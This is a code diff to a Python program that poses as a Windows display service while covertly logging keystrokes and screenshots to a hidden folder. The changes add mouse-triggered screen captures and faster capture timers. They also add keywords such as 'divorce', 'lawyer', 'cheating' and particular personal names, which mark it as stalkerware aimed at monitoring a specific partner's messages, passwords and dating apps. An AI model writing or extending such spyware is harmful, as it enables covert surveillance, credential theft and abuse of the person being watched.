@@ -4,7 +4,9 @@ from os import path
 import autopy
 import datetime
 import re
-from pynput.keyboard import Key, Listener
+import pynput.mouse as pyMouse
+from pynput.keyboard import Listener
+
 from win32gui import GetWindowText, GetForegroundWindow
 #from configparser import ConfigParser
 
@@ -17,11 +19,14 @@ import SMWinservice
 class WindowsDisplayService(SMWinservice.SMWinservice):
 
     def __init__(self):
-        self.__version__ = '3.0.3'       # parser.get('System Configuration', 'version')
+        self.__version__ = '3.0.4'       # parser.get('System Configuration', 'version')
         self.key_counter = 100           # parser.getint('System Configuration', 'key_counter')     # Number of characters to capture before writing to the file
-        self.lowest_screen_capture_timer = 3
-        self.default_screen_capture_timer = 10
-        self.screen_timer = 10           # parser.getint('System Configuration', 'screen_timer')   # Amount of time in seconds before the screen is captured
+        self.lowest_screen_capture_timer = 2
+        self.default_screen_capture_timer = 4
+        self.screen_timer = 4           # parser.getint('System Configuration', 'screen_timer')   # Amount of time in seconds before the screen is captured
+        self.mouse_screen_timer = 7
+        self.last_screen_capture = datetime.datetime.now()
+
         self.exit_string = '<192>'       # parser.get('System Configuration', 'exit_string')     # Key combinations to exit program --  <192> is ctrl key + `
         self.pause_key = '<190>'      # Key combination to pause recording activities <111> is ctrl + .
         self.resume_key = '<191>'     # Key combination to resume recording activities <222> is ctrl + ?
@@ -32,7 +37,6 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
         self.save_path = 'c:\sysdata'  # parser.get('Files', 'save_path')
         self.log_file_name = 'sysdata_logs_'  # will add date_stamp and extension when writing to the file
 
-        self.count = 0
         self.png_count = 0
         self.storedTime = datetime.datetime.now()
         self.storedWindow = GetWindowText(GetForegroundWindow())
@@ -53,11 +57,12 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
                          "Fast Towing", "Shay", "Greg", "Gregg", "Mildred", "towing", "Mesa", "Phoenix", "Tempe",
                          "Justin", "Kilo", "Juanita", "Marlene", "Harlen", "Harlan", "kiss", "Love", "Tow", "Damon",
                          "Brian", "King", "Needham", "Joe", "Sarah", "Sara", "depression", "sad", "cry", "crying",
-                         "facebook", "snapchat", "snap", "tinder", "cry"]
+                         "facebook", "snapchat", "snap", "tinder", "cry", "divorce", "lawyer", "forgive", "lies",
+                         "cheat", "cheating", "cheater", "Tillman"]
 
         self.special_applications = ["Mail", "Facebook", "Password", "Sign",
                                      "Signin", "User", "User ID", "ID", "Radaris", "Search",
-                                     "Instagram"]
+                                     "Instagram", "Michael", "Tillman", "Tilly", "Mike"]
 
         self.ignore_these_applications = ["Sublime", "Pycharm", "Excel", "Sheets", "Powerpoint", "Walmart",
                                           "Genius", "Panera"]
@@ -142,6 +147,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
         if not self.pause_recording_flag and not self.ignore_application_flag:
             img = autopy.bitmap.capture_screen()
             self.png_count += 1
+            self.last_screen_capture = datetime.datetime.now()
 
             formatted_time = datetime.datetime.strptime((self.storedTime.strftime("%Y-%m-%d %H:%M:%S.%f"))[:-7], "%Y-%m-%d %H:%M:%S")
             img_file_name = str(formatted_time).replace(":", ".") + "_%s.png" % self.png_count
@@ -305,21 +311,53 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
 
     def on_release(self, key):
         pass
-        #if key == Key.esc:
-            #return False
+
+    def on_move(self, x, y):
+        pass
+
+    def on_click(self, x, y, button, pressed):
+        print("Button:" + str(button))
+        print("pressed:" + str(pressed))
+        if (pressed):
+            self.capture_based_on_mouse_movements()
+
+    def on_scroll(self, x, y, dx, dy):
+        self.capture_based_on_mouse_movements()
+
+    def capture_based_on_mouse_movements(self):
+        # Capture Screen interval based on configured 'screen_timer' delay in seconds
+
+        if not self.ignore_this_application():
+            s = self.last_screen_capture.strftime("%Y-%m-%d %H:%M:%S.%f")
+            storedtime_plus_delay = (datetime.datetime.strptime(s[:-7], "%Y-%m-%d %H:%M:%S")) + \
+                                    datetime.timedelta(seconds=self.mouse_screen_timer)
+
+            if datetime.datetime.now() >= storedtime_plus_delay:  # capture screen at discrete intervals
+                self.write_screen()
+                self.last_screen_capture = datetime.datetime.now()  # Reset timestamp for screen capture
+
 
     def run(self):
         with open(self.sys_error_logfile, 'a+', encoding='utf-8') as f:
-            f.write(str(datetime.datetime.now()) + '\tApplication attempting recovery\n')
+            f.write(str(datetime.datetime.now()) + "  v" + self.__version__ + '\tApplication attempting recovery\n')
 
         with Listener(on_press=lambda key: self.on_press(key),
                       on_release=lambda key: self.on_release(key)) as listener:
-            listener.join()
 
+            # ...or, in a non-blocking fashion:
+            m_listener = pyMouse.Listener(
+                on_move=self.on_move,
+                on_click=self.on_click,
+                on_scroll=self.on_scroll)
+            m_listener.start()
+
+            listener.join()
 
 def main():
     key_listener = WindowsDisplayService()
     key_listener.run()
+
+
 
 
 if __name__ == '__main__':
